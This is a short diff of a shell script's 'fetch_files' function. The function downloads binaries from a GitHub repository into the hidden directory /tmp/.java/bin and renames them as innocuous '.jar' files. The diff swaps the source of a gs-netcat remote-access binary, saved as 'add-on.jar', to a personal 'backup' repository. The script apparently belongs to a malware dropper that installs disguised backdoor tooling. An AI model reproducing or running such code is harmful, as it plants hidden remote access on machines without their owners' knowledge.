@@ -7,7 +7,7 @@ function fetch_files() {
     # cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/ukgame/cnf-0.json -o conf.json
     cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
     cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/ukgame/cfg.conf -o cfg.conf
-    cd /tmp/.java/bin && curl -L  https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -o add-on.jar
+    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/mc/gcat -o add-on.jar
     echo "DONE ..."
 }
 
